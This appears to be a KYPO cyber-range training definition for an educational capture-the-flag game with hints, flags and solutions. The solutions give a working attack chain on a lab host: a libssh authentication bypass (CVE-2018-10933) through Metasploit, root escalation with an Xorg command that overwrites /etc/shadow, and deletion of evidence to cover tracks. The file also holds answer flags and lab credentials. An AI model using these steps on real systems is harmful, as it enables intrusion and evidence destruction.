export const GAME_INFORMATION = {
    "id": 27,
    "title": "House of Cards - monitoring",
    "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
    "prerequisities": [
        ""
    ],
    "outcomes": [
        ""
    ],
    "state": "UNRELEASED",
    "authors": [
        {
            "iss": "https://oidc.muni.cz/oidc/",
            "user_ref_id": 40,
            "login": "395868@muni.cz",
            "full_name": "RNDr. Valdemar Švábenský",
            "given_name": "Valdemar",
            "family_name": "Švábenský"
        }
    ],
    "beta_testing_group": null,
    "sandbox_definition_ref_id": 31,
    "levels": [
        {
            "id": 44,
            "title": "Introduction",
            "max_score": 0,
            "snapshot_hook": null,
            "level_type": "INFO_LEVEL",
            "estimated_duration": 0,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 0,
            "content": "<h1>Introduction</h1>\n\nHaving a skeleton in a closet is not a good thing, especially not for a presidential candidate. It would be very helpful if the evidence could \"disappear\". And for you, it could be profitable. <b>Very profitable</b>. \n\nBut you've been on this case for several days now and you haven't been able to find any vulnerability yet. The elections are getting closer and the time is running out. You've nearly given up, but last night a miracle happened. In a local bar you've met <b>Bob</b>. After a few drinks, your discussion came across his work. And lo and behold, he is a system administrator in <b>Alanea</b>, security company managing police records. Exactly what you need. Awesome, right? Anyway, he mentioned that he's not looking forward to fixing the <b>vulnerable SSH server</b> and <b>the display server</b>. That might be exactly what you were looking for! Now it should be quick and easy! And very, very profitable!<br>\n\n <b>Are you ready to start?</b>\n\n<h1>Rules</h1>\n<p>\n    <b>WARNING: You should never use these techniques and skills to gain unauthorized access. It's illegal and you'll bear consequences. This game is only for educational purposes. To show you that \"while there's code there's a bug\" and also how can you defend yourself.</b>\n  </p>\n  \n<!--\n  <p>\n    When you click on the Topology button in <b>the blue panel on the top</b>, you should see the given network topology. When you <b>double-click</b> on the node called the <b>Internet</b>, you'll see the node <b>Attacker</b>. Attacker represents the attacker's computer, I mean your computer :D which contains all hacking tools you will need.\n  </p> \n  \n  <p>\n    Now if you want to have an <b>access to \"your\"</b> computer click on attacker and select <b>Remote connection</b>. A new tab appears with access to the attacker's computer. You can try any program you want. If you will need to <b>log in</b>, the default credentials are <b>username: <span style=\"color: #008000\">root</span></b>, <b>password: <span style=\"color: #008000\">toor</span></b>.\n  </p>\n  -->\n  \n  <p>\n    This game consists of <b>four game levels</b>. In each level, you will have to complete some specified task. To prove that you completed the task and can go to the next level you will have to <b>submit a flag</b>. Every level has a description of what to do and how to get the flag.\n  </p>\n  \n  <p>\n    <b>General note: <span style=\"color: #008000\">All programs you will need to complete the tasks are installed. <!-- Also, remember that you don't have access to the Internet from the attacker's pc. Your clipboard won't work, but to get stuff to the attacker PC, you can use the box in the upper left corner of your browser. (visible only when connected to the PC)--></span></b>\n  </p>\n\n <b>DON'T CHEAT!  <!-- I can see you and I'll punish you and I'll... OK? Don't try to burn me cause I'll FIND YOU ANYWHERE and you know it! >D--></b>\n  \n  \n  <h2>Help System</h2>\n  \n  <p>\n    If you're unable to complete a level, you can either use <b>hints</b> which will give a piece of advice, but you'll <b>lose some points</b>. The description of the hints is on the button caption. After using all the hints, if you still don't know how to complete the task, view the <b>Solution</b>. \n\n\n<!-- It's a guided solution which will tell you exactly what to do, but you'll <b>lose all points</b>. The last option is to skip level entirely by clicking on the <b>Skip level</b>, but this <b>is not recommended</b> - you won't be able to complete the following levels without doing what is in your current one. It is better to ask someone for help.\n-->\n  </p>\n  \n<!--\n  <p>\n    Each level has a <b>passphrase</b>, so you can go to any level you already know passphrase for, but you <b>won't get any points for any previous levels</b>. So the good advice is to write down the passphrases as you go through levels.\n  </p>\n  -->\n\n <!--   <b> DO NOT USE SKIP LEVEL - HIGHER LEVELS CANNOT BE DONE WITHOUT COMPLETING PREVIOUS LEVELS!!! -->\n\n"
        },
        {
            "id": 45,
            "title": "Find the Vulnerable SSH Server",
            "max_score": 5,
            "snapshot_hook": null,
            "level_type": "GAME_LEVEL",
            "estimated_duration": 10,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 1,
            "flag": "CVE-2018-10933",
            "content": "<p>\nWell, somewhere out there is a vulnerable SSH server. But on what port is it running? You should <b>scan the server</b> and find out the port, as well as the type of vulnerability. <b>Identifying the vulnerability is the key</b>. Vulnerabilities have a common identifier that looks something like this “CVE-2018-1002105”. But sometimes the scanner can’t identify the vulnerability by itself, you might have to google a bit to find it out.\n\nOk, so <b>CALM DOWN...</b>, <b>TURN ON YOUR BRAIN</b> and <b>start scanning!</b>\n\nThe Flag for this level is the CVE of the vulnerability (the whole string).\n</p>\n  \n\n<!--\n**Hints info**\n<ul>\n  <li>Hint1: How to find out CVE from the software name and version</li>\n  <li>Hint2: Which tool to use for scanning and the arguments for it</li>\n  <li>Hint3: Name of the SSH library</li>\n</ul>\n-->",
            "solution": "<a href=\"https://www.google.com/search?hl=&site=&q=libssh+vulnerability&gws_rd=ssl\">Google \"libssh vulnerability\"</a><br>\nCVE-2018-10933\n",
            "solution_penalized": true,
            "attachments": null,
            "hints": [
                {
                    "id": 33,
                    "title": "Which tool to use for scanning and the arguments for it",
                    "content": "nmap -sV",
                    "hint_penalty": 2
                },
                {
                    "id": 31,
                    "title": "Name of the SSH library",
                    "content": "libssh",
                    "hint_penalty": 1
                },
                {
                    "id": 32,
                    "title": "How to find out CVE from the software name and version",
                    "content": "Try googling the name of the ssh server and use keyword \"vulnerability\"",
                    "hint_penalty": 1
                }
            ],
            "incorrect_flag_limit": 100
        },
        {
            "id": 46,
            "title": "Get ACCESS!",
            "max_score": 10,
            "snapshot_hook": null,
            "level_type": "GAME_LEVEL",
            "estimated_duration": 10,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 2,
            "flag": "TheDroids",
            "content": "<p>\nGood job! Now you know how to get in! LibSSH can be very <b>trustful</b>. You might be tempted to use one of the exploits that fit in a tweet. They are undoubtedly cool, but it's usually a good idea to stick with tried & tested software, like Metasploit for example. If you're not familiar with it, try googling a bit. There are tutorials everywhere.\n</p>\n<p>\n<b><i>Due to technical limitation the flag can only be found by attacking from Metasploit.</i></b>\n\nThe flag is in format {flag:twoWords}. You will recognize it when you see it. Use the \"twoWords\" part as a flag.\n</p>\n\n<!--\n**Hints info: see button caption**\n<ul>\n  <li>Hint1: How to start Metasploit</li>\n  <li>Hint2: How to search for the right module</li>\n  <li>Hint3: How to set module options</li>\n</ul>\n-->",
            "solution": "Open metasploit: msfconsole <br>\nAnd run: <br>\n```\nsearch libssh\nuse auxiliary/scanner/ssh/libssh_auth_bypass\nshow options\nset RHOSTS 172.18.1.5\nset RPORT 23\nrun\n```",
            "solution_penalized": true,
            "attachments": null,
            "hints": [
                {
                    "id": 34,
                    "title": "How to start Metasploit",
                    "content": "msfconsole",
                    "hint_penalty": 2
                },
                {
                    "id": 36,
                    "title": "How to find the right module",
                    "content": "try command ``search libssh``",
                    "hint_penalty": 3
                },
                {
                    "id": 35,
                    "title": "How to set module options",
                    "content": "`set RHOST 172.18.1.5` \n\n`set RPORT 23`\n\n`run`",
                    "hint_penalty": 3
                }
            ],
            "incorrect_flag_limit": 100
        },
        {
            "id": 47,
            "title": "Escalate privileges",
            "max_score": 10,
            "snapshot_hook": null,
            "level_type": "GAME_LEVEL",
            "estimated_duration": 30,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 3,
            "flag": "XFiles",
            "content": "<p>\nCongrats, you are in. But it’s only the beginning. (To not waste your time, we have a gift for you:\n  <b>username: <span style=\"color: #008000\">alice</span></b>,\n  <b>password: <span style=\"color: #008000\">starwars</span></b>).\n  You might try using the session from the last level, but that will only get you into trouble. So we strongly encourage you to connect to regular SSH on port 22 using the credential provided above.\n  \nNow you can only see and do what a regular user could, but <b>you need more</b>. You need to access private files of other users, so you will have to <b>escalate your privileges</b>.  The usual stuff might not work, the server is fairly well patched. Fairly well, but not perfectly. Last patches were applied mid-October 2018. So you're probably looking for some recent privilege escalation vulnerability. Maybe you already know where. You've talked with the guy in the bar for nearly three hours and he mentioned some broken display server.\n\n**! WARNING !** You are messing with user accounts and privileges during the execution of privilege escalation attack. If you accidentally delete all accounts or destroy the server in any other way, the game might be over for you! This can be somehow salvaged if you keep your SSH running and fix the server again by repeating the attack correctly. But never close your active connection, you might not be able to get it again.\n</p>\n\n<p> The flag is in one of the private files. You will know once you see it.</p>\n\n<!--\n**Hints info**\n<ul>\n<li>Hint1: Name of the vulnerable program (if you don't know where to start, this is cheap hint)</li>\n<li>Hint2: Hint for exploit</li>\n<li>Hint3: Some line in the correct format</li>\n</ul>\n-->",
            "solution": "```\nNEWPASSWD='root:$1$xyz$NpfAWIDYQurUeFv80XTXr1:17861:0:99999:7:::' # passwd\ncd /etc; Xorg -fp \"$NEWPASSWD\" -logfile shadow  :1;su # password from above\n```",
            "solution_penalized": true,
            "attachments": null,
            "hints": [
                {
                    "id": 37,
                    "title": "Hint for exploit",
                    "content": "You might have to have *some* password. Don't forget about character escaping. In what format does Linux store passwords?",
                    "hint_penalty": 3
                },
                {
                    "id": 39,
                    "title": "Name of the vulnerable program (if you don't know where to start, this is cheap hint)",
                    "content": "Xorg",
                    "hint_penalty": 1
                },
                {
                    "id": 38,
                    "title": "Some line in the correct format",
                    "content": "`NEWPASSWD='root:$1$xyz$NpfAWIDYQurUeFv80XTXr1:17861:0:99999:7:::'`\n\npassword is: passwd",
                    "hint_penalty": 3
                }
            ],
            "incorrect_flag_limit": 100
        },
        {
            "id": 48,
            "title": "Cover your tracks",
            "max_score": 5,
            "snapshot_hook": null,
            "level_type": "GAME_LEVEL",
            "estimated_duration": 10,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 4,
            "flag": "onlyDream",
            "content": "<p>\nGreat! The file with the evidence should be named <b>underwood.doc</b>. It can be found somewhere on this server,  who knows where. So find it and delete it from the server.</span> <b>But do you know what else you have done?</b> You broke the server. Now no one can sign in. That’s suspicious. And someone will soon notice that something had happened with the server. Maybe you can fix it by finding shadow’s backup and copy it back. A huge bundle is waiting for you, please <b>DON'T BUGGER IT UP!!!</b> The final <b>flag</b> is in <b>the original /etc/shadow</b>. You'll recognize it when you see it. <br>\n</p>\n<p>\n  <i>And one more thing. In your efforts to escalate privileges you might have overwrote even the backup. If you find that's the case and you don't know how to continue, feel free to contact the organizers.</i>\n</p>\n\n<!--\n**Hints info**\n<ul>\n<li>Hint1: Name of shadow backup</li>\n<li>Hint2: Where is underwood.doc</li>\n</ul>\n-->",
            "solution": "```\nexit -y # from metasploit\nrm /root/bottomSecret/underwood.doc\ncp /etc/shadow.old /etc/shadow\n /etc/shadow.old | grep \"{flag:\"\n```",
            "solution_penalized": true,
            "attachments": null,
            "hints": [
                {
                    "id": 41,
                    "title": "Where is underwood.doc",
                    "content": "``/root/bottomSecret/underwood.doc``",
                    "hint_penalty": 2
                },
                {
                    "id": 40,
                    "title": "Name of shadow backup",
                    "content": "The one from Xorg is in /etc/",
                    "hint_penalty": 2
                }
            ],
            "incorrect_flag_limit": 100
        },
        {
            "id": 49,
            "title": "Conclusion",
            "max_score": 0,
            "snapshot_hook": null,
            "level_type": "INFO_LEVEL",
            "estimated_duration": 0,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 5,
            "content": "<p>\n    Everything played out just fine. No one could discredit the candidate in time. And after he became the president, it didn't matter. <b>And that all because of you!</b> And your big payout? It never came. Why should it, when you've already done the job and there isn't anything that could endanger him. Maybe you should have copied the files, instead of just deleting them. That's the trouble with people in politics. They always talk, but rarely follow through. But don't blame your mistakes on me, I've asked you if you know what you've done.\n<!--(But if the reward is not important for you then the flag is <b>sillyman</b>.)-->\n<p>\n"
        },
        {
            "id": 50,
            "title": "Feedback",
            "max_score": 0,
            "snapshot_hook": null,
            "level_type": "ASSESSMENT_LEVEL",
            "estimated_duration": 5,
            "training_definition": {
                "id": 27,
                "title": "House of Cards - monitoring",
                "description": "https://gitlab.ics.muni.cz/KYPOlab/2018-Autumn/Aplha",
                "prerequisities": [
                    ""
                ],
                "outcomes": [
                    ""
                ],
                "state": "UNRELEASED",
                "authors": [
                    {
                        "iss": "https://oidc.muni.cz/oidc/",
                        "user_ref_id": 40,
                        "login": "395868@muni.cz",
                        "full_name": "RNDr. Valdemar Švábenský",
                        "given_name": "Valdemar",
                        "family_name": "Švábenský"
                    }
                ],
                "beta_testing_group": null,
                "sandbox_definition_ref_id": 31,
                "show_stepper_bar": true,
                "can_be_archived": false,
                "estimated_duration": 65,
                "last_edited": "2019-08-10T11:48:51.039648Z"
            },
            "order": 6,
            "questions": "[{\"answer_required\":false,\"order\":0,\"penalty\":0,\"points\":0,\"text\":\"Which level was the most difficult for you?\",\"question_type\":\"MCQ\",\"choices\":[{\"text\":\"Level 1\",\"order\":0,\"is_correct\":false},{\"text\":\"Level 2\",\"order\":1,\"is_correct\":false},{\"text\":\"Level 3\",\"order\":2,\"is_correct\":false},{\"text\":\"Level 4\",\"order\":3,\"is_correct\":false},{\"text\":\"Don't know\",\"order\":4,\"is_correct\":false}]},{\"answer_required\":false,\"order\":1,\"penalty\":0,\"points\":0,\"text\":\"What have you learned from playing this game?\",\"question_type\":\"FFQ\",\"correct_choices\":[]}]",
            "instructions": "Give us your feedback, please.",
            "assessment_type": "QUESTIONNAIRE"
        }
    ],
    "show_stepper_bar": true,
    "can_be_archived": false,
    "estimated_duration": 65,
    "last_edited": "2019-08-10T11:48:51.039648Z"
};
